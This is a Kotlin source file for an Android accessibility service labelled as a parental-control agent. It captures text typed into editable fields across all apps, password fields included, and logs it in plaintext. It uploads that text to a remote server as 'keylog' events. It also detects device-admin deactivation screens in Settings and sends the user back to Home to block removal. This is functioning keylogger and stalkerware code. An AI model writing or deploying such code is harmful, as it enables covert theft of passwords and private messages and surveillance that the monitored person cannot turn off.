package com.parental.agent.services

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.parental.agent.data.local.AppDatabase
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.data.local.entity.NormalizedEventEntity
import com.parental.agent.sync.ApiConstants
import com.parental.agent.sync.SyncPayload
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class AgentAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "AgentAccessibility"
        private const val DEBOUNCE_FLUSH_DELAY_MS = 2000L // 2-second typing pause flushes complete final text
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var pendingFlushRunnable: Runnable? = null

    @Volatile
    private var currentDraftText: String = ""
    @Volatile
    private var currentDraftPkg: String = ""
    @Volatile
    private var lastFlushedText: String = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // 1. Intercept Settings window when attempting to deactivate device admin
        if (packageName == "com.android.settings") {
            val rootNode = rootInActiveWindow
            if (rootNode != null) {
                checkAndShieldDeactivationScreen(rootNode)
            }
        }

        // 2. Pure Keystroke Input Engine: Only capture TYPE_VIEW_TEXT_CHANGED for active text inputs
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            captureKeylogData(event, packageName)
        }
    }

    private fun captureKeylogData(event: AccessibilityEvent, packageName: String) {
        try {
            val sourceNode = event.source
            
            // Programmatically check if the event originates from an active editable input field (EditText / Search Box)
            val isEditableInput = (sourceNode != null && sourceNode.isEditable) || event.isPassword
            if (!isEditableInput) {
                return // Ignore non-editable static screen headers, button labels, and system UI titles
            }

            var capturedText = event.text.filterNotNull().joinToString(" ").trim()

            if (capturedText.isBlank() && sourceNode != null) {
                capturedText = sourceNode.text?.toString()?.trim() ?: ""
            }

            if (capturedText.isBlank()) return

            // If user switched apps, flush previous draft immediately
            if (currentDraftPkg.isNotEmpty() && currentDraftPkg != packageName && currentDraftText.isNotBlank()) {
                flushCurrentDraftNow()
            }

            currentDraftPkg = packageName
            currentDraftText = capturedText

            // Cancel any pending timer and schedule 2s debounced flush for final typed sentence text
            pendingFlushRunnable?.let { mainHandler.removeCallbacks(it) }

            val runnable = Runnable {
                flushCurrentDraftNow()
            }
            pendingFlushRunnable = runnable
            mainHandler.postDelayed(runnable, DEBOUNCE_FLUSH_DELAY_MS)

        } catch (e: Exception) {
            Log.e(TAG, "Error in captureKeylogData: ${e.message}")
        }
    }

    @Synchronized
    private fun flushCurrentDraftNow() {
        pendingFlushRunnable?.let { mainHandler.removeCallbacks(it) }
        pendingFlushRunnable = null

        val textToFlush = currentDraftText.trim()
        val pkgToFlush = currentDraftPkg

        if (textToFlush.isBlank() || textToFlush == lastFlushedText) {
            return
        }

        lastFlushedText = textToFlush
        currentDraftText = ""

        val now = System.currentTimeMillis()
        val appName = getAppNameFromPackage(pkgToFlush)
        val cleanPkg = pkgToFlush.replace(".", "_")
        val deterministicEventId = "evt_keylog_${cleanPkg}_${now}"

        Log.i(TAG, "KEYLOGGER FLUSHED TYPED SENTENCE: App=$appName ($pkgToFlush), Text=\"$textToFlush\"")

        val payload = JSONObject().apply {
            put("packageName", pkgToFlush)
            put("appName", appName)
            put("typedText", textToFlush)
            put("timestamp", now)
        }

        val eventEntity = NormalizedEventEntity(
            eventId = deterministicEventId,
            deviceId = prefsDeviceId(),
            source = "keylogger",
            eventType = "keystroke_log",
            timestamp = now,
            collectionMethod = "accessibility",
            payloadJson = payload.toString(),
            isSynced = false
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val database = AppDatabase.getInstance(applicationContext)
                database.eventDao().insertEvent(eventEntity)
                performInstantUpload(database, prefsDeviceId())
            } catch (e: Exception) {
                Log.e(TAG, "Error saving keylog event: ${e.message}")
            }
        }
    }

    private fun prefsDeviceId(): String {
        return try {
            AppPreferences(applicationContext).getDeviceId()
        } catch (e: Exception) {
            "dev_local_agent"
        }
    }

    private fun getAppNameFromPackage(packageName: String): String {
        return try {
            val pm = applicationContext.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            when {
                packageName.contains("dialer") || packageName.contains("phone") -> "Phone Dialer"
                packageName.contains("latin") || packageName.contains("gboard") || packageName.contains("keyboard") -> "Keyboard"
                else -> packageName
            }
        }
    }

    private fun checkAndShieldDeactivationScreen(rootNode: AccessibilityNodeInfo) {
        val isDeactivationScreen = containsText(rootNode, "Device admin") ||
                containsText(rootNode, "Device administrator") ||
                containsText(rootNode, "Deactivate") ||
                containsText(rootNode, "UNINSTALLATION BLOCKED")

        if (isDeactivationScreen) {
            val prefs = AppPreferences(applicationContext)
            if (!prefs.isUninstallationAllowed()) {
                Log.w(TAG, "Blocking deactivation screen attempt! Returning to Home Screen...")
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
        }
    }

    private fun containsText(node: AccessibilityNodeInfo?, targetText: String): Boolean {
        if (node == null) return false

        val text = node.text?.toString() ?: ""
        if (text.contains(targetText, ignoreCase = true)) {
            return true
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (containsText(child, targetText)) {
                return true
            }
        }
        return false
    }

    private suspend fun performInstantUpload(database: AppDatabase, activeDeviceId: String) {
        val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 20)

        if (unsyncedEvents.isNotEmpty()) {
            val eventPayloads = unsyncedEvents.map { entity ->
                val payloadMap = try {
                    val json = JSONObject(entity.payloadJson)
                    val map = mutableMapOf<String, Any?>()
                    json.keys().forEach { key -> map[key] = json.get(key) }
                    map
                } catch (e: Exception) {
                    emptyMap<String, Any?>()
                }

                mapOf(
                    "eventId" to entity.eventId,
                    "deviceId" to activeDeviceId,
                    "source" to entity.source,
                    "eventType" to entity.eventType,
                    "timestamp" to entity.timestamp,
                    "collectionMethod" to entity.collectionMethod,
                    "payload" to payloadMap
                )
            }

            val payload = SyncPayload(
                deviceId = activeDeviceId,
                events = eventPayloads
            )

            val response = ApiConstants.apiService.syncEvents(payload)

            if (response.isSuccessful && response.body()?.success == true) {
                val body = response.body()
                val serverConfirmedIds = body?.syncedEventIds.orEmpty()
                val localEventIds = unsyncedEvents.map { it.eventId }
                val confirmedSyncedIds = localEventIds.filter { id -> serverConfirmedIds.contains(id) }

                if (confirmedSyncedIds.isNotEmpty()) {
                    database.eventDao().markEventsSynced(confirmedSyncedIds)
                    Log.i(TAG, "SUCCESS: Keylog Payload server ACK confirmed for ${confirmedSyncedIds.size} event(s).")
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted.")
    }
}
